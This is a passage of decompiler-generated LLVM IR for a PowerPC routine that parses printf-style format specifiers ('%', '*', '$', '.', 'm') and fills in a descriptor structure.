  br i1 %v3_1000d81c, label %dec_label_pc_1000d7e8, label %dec_label_pc_1000d884

dec_label_pc_1000d828:                            ; preds = %dec_label_pc_1000d844, %dec_label_pc_1000d7ec
  %v0_1000d848 = phi i32 [ %v0_1000d7ec, %dec_label_pc_1000d7ec ], [ %v1_1000d848, %dec_label_pc_1000d844 ]
  store i32 %v0_1000d848, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_100194c0.724 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000d838 = inttoptr i32 %v0_1000d848 to i8*
  br label %dec_label_pc_1000d830

dec_label_pc_1000d830:                            ; preds = %dec_label_pc_1000d850, %dec_label_pc_1000d828
  %v1_1000d844 = phi i32 [ %v1_1000d854, %dec_label_pc_1000d850 ], [ 1, %dec_label_pc_1000d828 ]
  %v0_1000d830 = phi i32 [ %v1_1000d834, %dec_label_pc_1000d850 ], [ ptrtoint ([8 x i8]* @global_var_100194c0.724 to i32), %dec_label_pc_1000d828 ]
  %v1_1000d830 = inttoptr i32 %v0_1000d830 to i8*
  %v2_1000d830 = load i8, i8* %v1_1000d830, align 1
  %v3_1000d830 = zext i8 %v2_1000d830 to i32
  store i32 %v3_1000d830, i32* %r9.global-to-local, align 4
  %v1_1000d834 = add i32 %v0_1000d830, 1
  store i32 %v1_1000d834, i32* %r11.global-to-local, align 4
  %v2_1000d838 = load i8, i8* %v1_1000d838, align 1
  %v3_1000d838 = zext i8 %v2_1000d838 to i32
  store i32 %v3_1000d838, i32* %r0.global-to-local, align 4
  %v4_1000d83c = icmp eq i8 %v2_1000d838, %v2_1000d830
  br i1 %v4_1000d83c, label %dec_label_pc_1000d844, label %dec_label_pc_1000d850

dec_label_pc_1000d844:                            ; preds = %dec_label_pc_1000d830
  %v0_1000d844 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000d844 = or i32 %v0_1000d844, %v1_1000d844
  store i32 %v2_1000d844, i32* %r6.global-to-local, align 4
  %v1_1000d848 = add i32 %v0_1000d848, 1
  br label %dec_label_pc_1000d828

dec_label_pc_1000d850:                            ; preds = %dec_label_pc_1000d830
  %v1_1000d850 = inttoptr i32 %v1_1000d834 to i8*
  %v2_1000d850 = load i8, i8* %v1_1000d850, align 1
  %v3_1000d850 = zext i8 %v2_1000d850 to i32
  store i32 %v3_1000d850, i32* %r0.global-to-local, align 4
  %v1_1000d854 = mul i32 %v1_1000d844, 2
  store i32 %v1_1000d854, i32* %r10.global-to-local, align 4
  %v3_1000d858 = icmp eq i8 %v2_1000d850, 0
  br i1 %v3_1000d858, label %dec_label_pc_1000d860, label %dec_label_pc_1000d830

dec_label_pc_1000d860:                            ; preds = %dec_label_pc_1000d850
  %v1_1000d860 = add i32 %v0_1000d848, -1
  %v2_1000d860 = inttoptr i32 %v1_1000d860 to i8*
  %v3_1000d860 = load i8, i8* %v2_1000d860, align 1
  %v4_1000d860 = zext i8 %v3_1000d860 to i32
  store i32 %v4_1000d860, i32* %r0.global-to-local, align 4
  %v0_1000d864 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000d864 = and i32 %v0_1000d864, 10
  store i32 0, i32* @r8, align 4
  %v3_1000d86c = icmp eq i8 %v3_1000d860, 37
  %v1_1000d870 = udiv i32 %v1_1000d864, 2
  store i32 %v1_1000d870, i32* %r9.global-to-local, align 4
  %v2_1000d874 = sub nuw nsw i32 -1, %v1_1000d870
  %v3_1000d874 = and i32 %v0_1000d864, %v2_1000d874
  store i32 %v3_1000d874, i32* %r6.global-to-local, align 4
  br i1 %v3_1000d86c, label %dec_label_pc_1000d884, label %dec_label_pc_1000d750

dec_label_pc_1000d880:                            ; preds = %dec_label_pc_1000d7ac, %dec_label_pc_1000d7fc
  store i32 %v0_1000d7ac, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d884

dec_label_pc_1000d884:                            ; preds = %dec_label_pc_1000d810, %dec_label_pc_1000d860, %dec_label_pc_1000d880
  %v0_1000d8b8 = phi i32 [ 0, %dec_label_pc_1000d860 ], [ %v0_1000d7d8, %dec_label_pc_1000d810 ], [ %v0_1000d7d8, %dec_label_pc_1000d880 ]
  %v1_1000d8c4 = phi i32 [ %v0_1000d848, %dec_label_pc_1000d860 ], [ %v0_1000d808, %dec_label_pc_1000d810 ], [ %v0_1000d808, %dec_label_pc_1000d880 ]
  %v0_1000d8c0 = phi i32 [ %v1_1000d834, %dec_label_pc_1000d860 ], [ %v0_1000d7ac, %dec_label_pc_1000d810 ], [ %v0_1000d7ac, %dec_label_pc_1000d880 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000d860 ], [ %stack_var_-84.1, %dec_label_pc_1000d810 ], [ %stack_var_-84.1, %dec_label_pc_1000d880 ]
  %v1_1000d884 = inttoptr i32 %v0_1000d8c0 to i8*
  %v2_1000d884 = load i8, i8* %v1_1000d884, align 1
  %v3_1000d884 = zext i8 %v2_1000d884 to i32
  store i32 %v3_1000d884, i32* %r0.global-to-local, align 4
  %v3_1000d888 = icmp eq i8 %v2_1000d884, 42
  br i1 %v3_1000d888, label %dec_label_pc_1000d890, label %dec_label_pc_1000d8d0

dec_label_pc_1000d890:                            ; preds = %dec_label_pc_1000d884
  %v0_1000d890 = load i32, i32* @r26, align 4
  %v3_1000d890 = icmp eq i32 %v0_1000d890, 0
  br i1 %v3_1000d890, label %dec_label_pc_1000d8c0, label %dec_label_pc_1000d898

dec_label_pc_1000d898:                            ; preds = %dec_label_pc_1000d890
  %v1_1000d898 = inttoptr i32 %v1_1000d8c4 to i8*
  %v2_1000d898 = load i8, i8* %v1_1000d898, align 1
  %v3_1000d898 = zext i8 %v2_1000d898 to i32
  store i32 %v3_1000d898, i32* %r0.global-to-local, align 4
  %v3_1000d89c = icmp eq i8 %v2_1000d898, 36
  br i1 %v3_1000d89c, label %dec_label_pc_1000d8a4, label %dec_label_pc_1000db90

dec_label_pc_1000d8a4:                            ; preds = %dec_label_pc_1000d898
  %tmp60 = icmp slt i32 %v0_1000d8b8, 1
  br i1 %tmp60, label %dec_label_pc_1000db90, label %dec_label_pc_1000d8ac

dec_label_pc_1000d8ac:                            ; preds = %dec_label_pc_1000d8a4
  %v0_1000d8ac = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d8ac = mul i32 %v0_1000d8ac, -4
  %v1_1000d8b0 = add i32 %v1_1000d8c4, 1
  store i32 %v1_1000d8b0, i32* @r30, align 4
  %v0_1000d8b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000d8b4 = add i32 %v0_1000d8b4, %v1_1000d8ac
  store i32 %v2_1000d8b4, i32* %r9.global-to-local, align 4
  %v2_1000d8b8 = add i32 %v2_1000d8b4, 12
  %v3_1000d8b8 = inttoptr i32 %v2_1000d8b8 to i32*
  store i32 %v0_1000d8b8, i32* %v3_1000d8b8, align 4
  %v0_1000d8d8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d8cc

dec_label_pc_1000d8c0:                            ; preds = %dec_label_pc_1000d890
  %v1_1000d8c0 = add i32 %v0_1000d8c0, 1
  store i32 %v1_1000d8c0, i32* %r0.global-to-local, align 4
  %v4_1000d8c4 = icmp eq i32 %v1_1000d8c0, %v1_1000d8c4
  br i1 %v4_1000d8c4, label %dec_label_pc_1000d8cc, label %dec_label_pc_1000db90

dec_label_pc_1000d8cc:                            ; preds = %dec_label_pc_1000d8c0, %dec_label_pc_1000d8ac
  %v0_1000d8d8.pre = phi i32 [ %v1_1000d8c4, %dec_label_pc_1000d8c0 ], [ %v0_1000d8d8.pre.pre, %dec_label_pc_1000d8ac ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1000d8d0

dec_label_pc_1000d8d0:                            ; preds = %dec_label_pc_1000d884, %dec_label_pc_1000d8cc
  %v0_1000d8d8 = phi i32 [ %v1_1000d8c4, %dec_label_pc_1000d884 ], [ %v0_1000d8d8.pre, %dec_label_pc_1000d8cc ]
  %v0_1000d8e8 = phi i32 [ %v0_1000d8b8, %dec_label_pc_1000d884 ], [ -2147483648, %dec_label_pc_1000d8cc ]
  %v0_1000d8d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000d8d0 = icmp eq i32 %v0_1000d8d0, 0
  %v1_1000d8d8 = inttoptr i32 %v0_1000d8d8 to i8*
  br i1 %v3_1000d8d0, label %dec_label_pc_1000d8d8, label %dec_label_pc_1000d8fc

dec_label_pc_1000d8d8:                            ; preds = %dec_label_pc_1000d8d0
  %v2_1000d8d8 = load i8, i8* %v1_1000d8d8, align 1
  %v3_1000d8d8 = zext i8 %v2_1000d8d8 to i32
  store i32 %v3_1000d8d8, i32* %r0.global-to-local, align 4
  %v3_1000d8dc = icmp eq i8 %v2_1000d8d8, 46
  br i1 %v3_1000d8dc, label %dec_label_pc_1000d8e4, label %dec_label_pc_1000d8f4

dec_label_pc_1000d8e4:                            ; preds = %dec_label_pc_1000d8d8
  %v1_1000d8e4 = add i32 %v0_1000d8d8, 1
  store i32 %v0_1000d8e8, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d750

dec_label_pc_1000d8f4:                            ; preds = %dec_label_pc_1000d8d8
  store i32 %v0_1000d8e8, i32* @r31, align 4
  br label %dec_label_pc_1000d8fc

dec_label_pc_1000d8fc:                            ; preds = %dec_label_pc_1000d8d0, %dec_label_pc_1000d8f4
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000d8f4 ], [ %v0_1000d8e8, %dec_label_pc_1000d8d0 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_1000d900 = load i8, i8* %v1_1000d8d8, align 1
  %v3_1000d900 = zext i8 %v2_1000d900 to i32
  store i32 %v3_1000d900, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10019468.725 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d908

dec_label_pc_1000d908:                            ; preds = %dec_label_pc_1000d914, %dec_label_pc_1000d8fc
  %v0_1000d914 = phi i32 [ %v1_1000d914, %dec_label_pc_1000d914 ], [ ptrtoint ([9 x i8]* @global_var_10019468.725 to i32), %dec_label_pc_1000d8fc ]
  %v1_1000d908 = inttoptr i32 %v0_1000d914 to i8*
  %v2_1000d908 = load i8, i8* %v1_1000d908, align 1
  %v3_1000d908 = zext i8 %v2_1000d908 to i32
  store i32 %v3_1000d908, i32* %r0.global-to-local, align 4
  %v4_1000d90c = icmp eq i8 %v2_1000d900, %v2_1000d908
  br i1 %v4_1000d90c, label %dec_label_pc_1000d6d8, label %dec_label_pc_1000d914

dec_label_pc_1000d914:                            ; preds = %dec_label_pc_1000d908
  %v1_1000d914 = add i32 %v0_1000d914, 1
  %v2_1000d914 = inttoptr i32 %v1_1000d914 to i8*
  %v3_1000d914 = load i8, i8* %v2_1000d914, align 1
  %v4_1000d914 = zext i8 %v3_1000d914 to i32
  store i32 %v4_1000d914, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d914, i32* %r11.global-to-local, align 4
  %v3_1000d918 = icmp eq i8 %v3_1000d914, 0
  br i1 %v3_1000d918, label %dec_label_pc_1000d920, label %dec_label_pc_1000d908

dec_label_pc_1000d920:                            ; preds = %dec_label_pc_1000d914, %dec_label_pc_1000d6d8
  %v0_1000d948 = phi i32 [ %v1_1000d6d8, %dec_label_pc_1000d6d8 ], [ %v0_1000d8d8, %dec_label_pc_1000d914 ]
  %v0_1000d944 = phi i32 [ %v0_1000d914, %dec_label_pc_1000d6d8 ], [ %v1_1000d914, %dec_label_pc_1000d914 ]
  %v2_1000d928 = sub i32 %v0_1000d944, ptrtoint ([9 x i8]* @global_var_10019468.725 to i32)
  store i32 %v2_1000d928, i32* %r9.global-to-local, align 4
  %v2_1000d92c = icmp sgt i32 %v2_1000d928, 1
  br i1 %v2_1000d92c, label %dec_label_pc_1000d94c, label %dec_label_pc_1000d934

dec_label_pc_1000d934:                            ; preds = %dec_label_pc_1000d920
  %v1_1000d934 = inttoptr i32 %v0_1000d948 to i8*
  %v2_1000d934 = load i8, i8* %v1_1000d934, align 1
  %v3_1000d934 = zext i8 %v2_1000d934 to i32
  store i32 %v3_1000d934, i32* %r0.global-to-local, align 4
  %v1_1000d938 = inttoptr i32 %v0_1000d944 to i8*
  %v2_1000d938 = load i8, i8* %v1_1000d938, align 1
  %v3_1000d938 = zext i8 %v2_1000d938 to i32
  store i32 %v3_1000d938, i32* %r9.global-to-local, align 4
  %v4_1000d93c = icmp eq i8 %v2_1000d934, %v2_1000d938
  br i1 %v4_1000d93c, label %dec_label_pc_1000d944, label %dec_label_pc_1000d94c

dec_label_pc_1000d944:                            ; preds = %dec_label_pc_1000d934
  %v1_1000d944 = add i32 %v0_1000d944, 9
  store i32 %v1_1000d944, i32* %r11.global-to-local, align 4
  %v1_1000d948 = add i32 %v0_1000d948, 1
  store i32 %v1_1000d948, i32* @r30, align 4
  br label %dec_label_pc_1000d94c

dec_label_pc_1000d94c:                            ; preds = %dec_label_pc_1000d934, %dec_label_pc_1000d920, %dec_label_pc_1000d944
  %v0_1000d950 = phi i32 [ %v0_1000d944, %dec_label_pc_1000d934 ], [ %v0_1000d944, %dec_label_pc_1000d920 ], [ %v1_1000d944, %dec_label_pc_1000d944 ]
  %v0_1000d94c = phi i32 [ %v0_1000d948, %dec_label_pc_1000d934 ], [ %v0_1000d948, %dec_label_pc_1000d920 ], [ %v1_1000d948, %dec_label_pc_1000d944 ]
  %v1_1000d94c = inttoptr i32 %v0_1000d94c to i8*
  %v2_1000d94c = load i8, i8* %v1_1000d94c, align 1
  %v3_1000d94c = zext i8 %v2_1000d94c to i32
  store i32 %v3_1000d94c, i32* @r7, align 4
  %v1_1000d950 = add i32 %v0_1000d950, 9
  %v2_1000d950 = inttoptr i32 %v1_1000d950 to i8*
  %v3_1000d950 = load i8, i8* %v2_1000d950, align 1
  %v4_1000d950 = zext i8 %v3_1000d950 to i32
  store i32 %v4_1000d950, i32* %r0.global-to-local, align 4
  %v3_1000d954 = icmp eq i8 %v2_1000d94c, 0
  %v1_1000d958 = mul nuw nsw i32 %v4_1000d950, 256
  store i32 %v1_1000d958, i32* %r10.global-to-local, align 4
  br i1 %v3_1000d954, label %dec_label_pc_1000db90, label %dec_label_pc_1000d960

dec_label_pc_1000d960:                            ; preds = %dec_label_pc_1000d94c
  %v1_1000d964 = and i32 %v1_1000d958, 1024
  store i32 %v1_1000d964, i32* %r0.global-to-local, align 4
  %v3_1000d964 = icmp eq i32 %v1_1000d964, 0
  store i32 268566528, i32* %r3.global-to-local, align 4
  %v3_1000d970 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000d970, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001949c.727 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_100194a8.726 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d980

dec_label_pc_1000d980:                            ; preds = %dec_label_pc_1000d9e4, %dec_label_pc_1000d960
  %v1_1000d98c = phi i32 [ %v1_1000d9e4, %dec_label_pc_1000d9e4 ], [ ptrtoint ([21 x i8]* @global_var_100194a8.726 to i32), %dec_label_pc_1000d960 ]
  %v1_1000d980 = inttoptr i32 %v1_1000d98c to i8*
  %v2_1000d980 = load i8, i8* %v1_1000d980, align 1
  %v3_1000d980 = zext i8 %v2_1000d980 to i32
  store i32 %v3_1000d980, i32* %r0.global-to-local, align 4
  %v4_1000d984 = icmp eq i8 %v2_1000d980, %v2_1000d94c
  br i1 %v4_1000d984, label %dec_label_pc_1000d98c, label %dec_label_pc_1000d9e4

dec_label_pc_1000d98c:                            ; preds = %dec_label_pc_1000d980
  %v2_1000d98c = sub i32 %v1_1000d98c, ptrtoint ([21 x i8]* @global_var_100194a8.726 to i32)
  %tmp61 = icmp slt i32 %v2_1000d98c, 18
  %brmerge = or i1 %v3_1000d964, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000d9a0, label %dec_label_pc_1000d99c

dec_label_pc_1000d99c:                            ; preds = %dec_label_pc_1000d98c
  %v1_1000d99c = add i32 %v2_1000d98c, -2
  br label %dec_label_pc_1000d9a0

dec_label_pc_1000d9a0:                            ; preds = %dec_label_pc_1000d98c, %dec_label_pc_1000d99c
  %storemerge = phi i32 [ %v1_1000d99c, %dec_label_pc_1000d99c ], [ %v2_1000d98c, %dec_label_pc_1000d98c ]
  %v0_1000d9a0 = phi i32 [ %v1_1000d99c, %dec_label_pc_1000d99c ], [ %v2_1000d98c, %dec_label_pc_1000d98c ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000d9a0 = load i32, i32* @r28, align 4
  %v2_1000d9a0 = add i32 %v1_1000d9a0, 32
  %v3_1000d9a0 = inttoptr i32 %v2_1000d9a0 to i32*
  store i32 %v0_1000d9a0, i32* %v3_1000d9a0, align 4
  store i32 ptrtoint (i32* @global_var_1001949b.728 to i32), i32* %r11.global-to-local, align 4
  %v0_1000d9ac.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d9a8

dec_label_pc_1000d9a8:                            ; preds = %dec_label_pc_1000d9a8, %dec_label_pc_1000d9a0
  %v0_1000d9a8 = phi i32 [ %v1_1000d9a8, %dec_label_pc_1000d9a8 ], [ ptrtoint (i32* @global_var_1001949b.728 to i32), %dec_label_pc_1000d9a0 ]
  %v1_1000d9a8 = add i32 %v0_1000d9a8, 1
  %v2_1000d9a8 = inttoptr i32 %v1_1000d9a8 to i8*
  %v3_1000d9a8 = load i8, i8* %v2_1000d9a8, align 1
  %v4_1000d9a8 = zext i8 %v3_1000d9a8 to i32
  store i32 %v4_1000d9a8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d9a8, i32* %r11.global-to-local, align 4
  %v3_1000d9ac = icmp sgt i32 %v0_1000d9ac.pre, %v4_1000d9a8
  br i1 %v3_1000d9ac, label %dec_label_pc_1000d9a8, label %dec_label_pc_1000d9b4

dec_label_pc_1000d9b4:                            ; preds = %dec_label_pc_1000d9a8
  %v0_1000d9b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000d9b4 = sub i32 %v1_1000d9a8, %v0_1000d9b4
  %v1_1000d9bc = mul i32 %v2_1000d9b4, 2
  store i32 %v1_1000d9bc, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001948c.729 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d9c4 = add i32 %v1_1000d9bc, ptrtoint (i32* @global_var_1001948c.729 to i32)
  %v3_1000d9c4 = inttoptr i32 %v2_1000d9c4 to i16*
  %v4_1000d9c4 = load i16, i16* %v3_1000d9c4, align 2
  %v5_1000d9c4 = sext i16 %v4_1000d9c4 to i32
  store i32 %v5_1000d9c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001947c.730 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_100194a8.726 to i32), i32* @r8, align 4
  %v2_1000d9d4 = add i32 %v1_1000d9bc, ptrtoint (i32* @global_var_1001947c.730 to i32)
  %v3_1000d9d4 = inttoptr i32 %v2_1000d9d4 to i16*
  %v4_1000d9d4 = load i16, i16* %v3_1000d9d4, align 2
  %v5_1000d9d4 = sext i16 %v4_1000d9d4 to i32
  store i32 %v5_1000d9d4, i32* %r9.global-to-local, align 4
  %v2_1000d9d8 = or i32 %v5_1000d9c4, %v1_1000d958
  store i32 %v2_1000d9d8, i32* %r0.global-to-local, align 4
  %v2_1000d9dc = and i32 %v5_1000d9d4, %v2_1000d9d8
  store i32 %v2_1000d9dc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d9f0

dec_label_pc_1000d9e4:                            ; preds = %dec_label_pc_1000d980
  %v1_1000d9e4 = add i32 %v1_1000d98c, 1
  %v2_1000d9e4 = inttoptr i32 %v1_1000d9e4 to i8*
  %v3_1000d9e4 = load i8, i8* %v2_1000d9e4, align 1
  %v4_1000d9e4 = zext i8 %v3_1000d9e4 to i32
  store i32 %v4_1000d9e4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d9e4, i32* @r8, align 4
  %v3_1000d9e8 = icmp eq i8 %v3_1000d9e4, 0
  br i1 %v3_1000d9e8, label %dec_label_pc_1000d9f0, label %dec_label_pc_1000d980

dec_label_pc_1000d9f0:                            ; preds = %dec_label_pc_1000d9e4, %dec_label_pc_1000d9b4
  %v0_1000d9f0 = phi i32 [ %v2_1000d9dc, %dec_label_pc_1000d9b4 ], [ %v3_1000d970, %dec_label_pc_1000d9e4 ]
  store i32 %v0_1000d9f0, i32* %stack_var_-96, align 4
  %v0_1000d9f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000d9f4 = call i32 @__asm_rlwinm(i32 %v0_1000d9f4, i32 30, i32 31, i32 31)
  %not.v2_1000d9f8 = icmp eq i32 %v1_1000d9f4, 0
  %v6_1000d9fc = sext i1 %not.v2_1000d9f8 to i32
  store i32 %v6_1000d9fc, i32* %r9.global-to-local, align 4
  %v1_1000da00 = call i32 @__asm_rlwinm(i32 %v1_1000d958, i32 0, i32 20, i32 23)
  store i32 %v1_1000da00, i32* %r0.global-to-local, align 4
  %v1_1000da04 = call i32 @__asm_rlwinm(i32 %v6_1000d9fc, i32 0, i32 0, i32 27)
  store i32 %v1_1000da04, i32* %r9.global-to-local, align 4
  %v0_1000da08 = load i32, i32* @r30, align 4
  %v1_1000da08 = inttoptr i32 %v0_1000da08 to i8*
  %v2_1000da08 = load i8, i8* %v1_1000da08, align 1
  %v3_1000da08 = zext i8 %v2_1000da08 to i32
  store i32 %v3_1000da08, i32* %r10.global-to-local, align 4
  %v0_1000da0c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000da0c = call i32 @__asm_rlwinm(i32 %v0_1000da0c, i32 0, i32 30, i32 28)
  %v1_1000da10 = add i32 %v1_1000da04, 48
  store i32 %v1_1000da10, i32* %r9.global-to-local, align 4
  %v2_1000da14 = or i32 %v1_1000da0c, %v1_1000da00
  store i32 %v2_1000da14, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_1000da1c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000da1c = load i32, i32* @r28, align 4
  %v2_1000da1c = add i32 %v1_1000da1c, 12
  %v3_1000da1c = inttoptr i32 %v2_1000da1c to i32*
  store i32 %v0_1000da1c, i32* %v3_1000da1c, align 4
  %v0_1000da20 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000da20 = load i32, i32* @r28, align 4
  %v2_1000da20 = add i32 %v1_1000da20, 4
  %v3_1000da20 = inttoptr i32 %v2_1000da20 to i32*
  store i32 %v0_1000da20, i32* %v3_1000da20, align 4
  %v0_1000da24 = load i32, i32* @r31, align 4
  %v1_1000da24 = load i32, i32* @r28, align 4
  %v2_1000da24 = add i32 %v1_1000da24, 8
  %v3_1000da24 = inttoptr i32 %v2_1000da24 to i32*
  store i32 %v0_1000da24, i32* %v3_1000da24, align 4
  %v0_1000da28 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000da28 = load i32, i32* @r28, align 4
  %v2_1000da28 = add i32 %v1_1000da28, 20
  %v3_1000da28 = inttoptr i32 %v2_1000da28 to i32*
  store i32 %v0_1000da28, i32* %v3_1000da28, align 4
  %v0_1000da2c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000da2c = load i32, i32* @r28, align 4
  %v2_1000da2c = add i32 %v1_1000da2c, 16
  %v3_1000da2c = inttoptr i32 %v2_1000da2c to i32*
  store i32 %v0_1000da2c, i32* %v3_1000da2c, align 4
  %v0_1000da30 = load i32, i32* @r7, align 4
  %v1_1000da30 = load i32, i32* @r28, align 4
  %v2_1000da30 = add i32 %v1_1000da30, 28
  %v3_1000da30 = inttoptr i32 %v2_1000da30 to i32*
  store i32 %v0_1000da30, i32* %v3_1000da30, align 4
  %v0_1000da34 = load i32, i32* @r8, align 4
  %v1_1000da34 = inttoptr i32 %v0_1000da34 to i8*
  %v2_1000da34 = load i8, i8* %v1_1000da34, align 1
  %v3_1000da34 = zext i8 %v2_1000da34 to i32
  store i32 %v3_1000da34, i32* %r9.global-to-local, align 4
  %v3_1000da38 = icmp eq i8 %v2_1000da34, 0
  br i1 %v3_1000da38, label %dec_label_pc_1000da40, label %dec_label_pc_1000da58

dec_label_pc_1000da40:                            ; preds = %dec_label_pc_1000d9f0
  %v0_1000da40 = load i32, i32* @r30, align 4
  %v1_1000da40 = inttoptr i32 %v0_1000da40 to i8*
  %v2_1000da40 = load i8, i8* %v1_1000da40, align 1
  %v3_1000da40 = zext i8 %v2_1000da40 to i32
  store i32 %v3_1000da40, i32* %r0.global-to-local, align 4
  %v3_1000da44 = icmp eq i8 %v2_1000da40, 109
  br i1 %v3_1000da44, label %dec_label_pc_1000da4c, label %dec_label_pc_1000db90

dec_label_pc_1000da4c:                            ; preds = %dec_label_pc_1000da40
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000da50 = load i32, i32* @r28, align 4
  %v2_1000da50 = add i32 %v1_1000da50, 28
  %v3_1000da50 = inttoptr i32 %v2_1000da50 to i32*
  store i32 %v3_1000da34, i32* %v3_1000da50, align 4
  %v0_1000da54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000da54 = load i32, i32* @r28, align 4
  %v2_1000da54 = add i32 %v1_1000da54, 32
  %v3_1000da54 = inttoptr i32 %v2_1000da54 to i32*
  store i32 %v0_1000da54, i32* %v3_1000da54, align 4
  br label %dec_label_pc_1000da58

dec_label_pc_1000da58:                            ; preds = %dec_label_pc_1000d9f0, %dec_label_pc_1000da4c
  %v0_1000da58 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000da58, 1
  br i1 %tmp62, label %dec_label_pc_1000db34, label %dec_label_pc_1000da60

dec_label_pc_1000da60:                            ; preds = %dec_label_pc_1000da58
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000da64

dec_label_pc_1000da64:                            ; preds = %dec_label_pc_1000db1c, %dec_label_pc_1000da60
  %v0_1000da8c = phi i32 [ 0, %dec_label_pc_1000da60 ], [ %v1_1000db20, %dec_label_pc_1000db1c ]
  %v2_1000da64 = icmp sgt i32 %v0_1000da8c, 2
  br i1 %v2_1000da64, label %dec_label_pc_1000da88, label %dec_label_pc_1000da6c

dec_label_pc_1000da6c:                            ; preds = %dec_label_pc_1000da64
  %v1_1000da6c = mul i32 %v0_1000da8c, 4
  store i32 %v1_1000da6c, i32* %r0.global-to-local, align 4
  %v0_1000da70 = load i32, i32* @r1, align 4
  %v2_1000da70 = add i32 %v0_1000da70, %v1_1000da6c
  store i32 %v2_1000da70, i32* %r9.global-to-local, align 4
  %v1_1000da74 = add i32 %v2_1000da70, 20
  %v2_1000da74 = inttoptr i32 %v1_1000da74 to i32*
  %v3_1000da74 = load i32, i32* %v2_1000da74, align 4
  store i32 %v3_1000da74, i32* %r0.global-to-local, align 4
  %v1_1000da78 = load i32, i32* @r28, align 4
  %v2_1000da78 = add i32 %v1_1000da78, %v0_1000da8c
  store i32 %v2_1000da78, i32* %r9.global-to-local, align 4
  %v1_1000da7c = urem i32 %v3_1000da74, 256
  store i32 %v1_1000da7c, i32* %r11.global-to-local, align 4
  %v1_1000da80 = trunc i32 %v3_1000da74 to i8
  %v3_1000da80 = add i32 %v2_1000da78, 36
  %v4_1000da80 = inttoptr i32 %v3_1000da80 to i8*
  store i8 %v1_1000da80, i8* %v4_1000da80, align 1
  %v0_1000da94.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000da94

dec_label_pc_1000da88:                            ; preds = %dec_label_pc_1000da64
  %v2_1000da8c = add i32 %v0_1000da8c, %stack_var_-84.3
  store i32 %v2_1000da8c, i32* %r9.global-to-local, align 4
  %v1_1000da90 = add i32 %v2_1000da8c, -2
  store i32 %v1_1000da90, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000da94

dec_label_pc_1000da94:                            ; preds = %dec_label_pc_1000da6c, %dec_label_pc_1000da88
  %v0_1000dab4 = phi i32 [ %v0_1000da94.pre, %dec_label_pc_1000da6c ], [ %v1_1000da90, %dec_label_pc_1000da88 ]
  %v1_1000da94 = load i32, i32* @r26, align 4
  %v3_1000da94 = icmp sgt i32 %v0_1000dab4, %v1_1000da94
  br i1 %v3_1000da94, label %dec_label_pc_1000da9c, label %dec_label_pc_1000daa8

dec_label_pc_1000da9c:                            ; preds = %dec_label_pc_1000da94
  %v2_1000da9c = icmp sgt i32 %v0_1000dab4, 9
  br i1 %v2_1000da9c, label %dec_label_pc_1000db90, label %dec_label_pc_1000daa4

dec_label_pc_1000daa4:                            ; preds = %dec_label_pc_1000da9c
  store i32 %v0_1000dab4, i32* @r26, align 4
  br label %dec_label_pc_1000daa8

dec_label_pc_1000daa8:                            ; preds = %dec_label_pc_1000da94, %dec_label_pc_1000daa4
  store i32 %v2_1000d744.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000daac = load i32, i32* @r27, align 4
  %v1_1000daac = mul i32 %v0_1000daac, 4
  store i32 %v1_1000daac, i32* %r0.global-to-local, align 4
  %v2_1000dab0 = add i32 %v1_1000daac, %v2_1000d744.pre-phi
  %v3_1000dab0 = inttoptr i32 %v2_1000dab0 to i32*
  %v4_1000dab0 = load i32, i32* %v3_1000dab0, align 4
  store i32 %v4_1000dab0, i32* @r31, align 4
  %v1_1000dab4 = add i32 %v0_1000dab4, -1
  store i32 %v1_1000dab4, i32* @r25, align 4
  %v1_1000dab8 = mul i32 %v1_1000dab4, 4
  %v3_1000dabc = icmp eq i32 %v4_1000dab0, 8
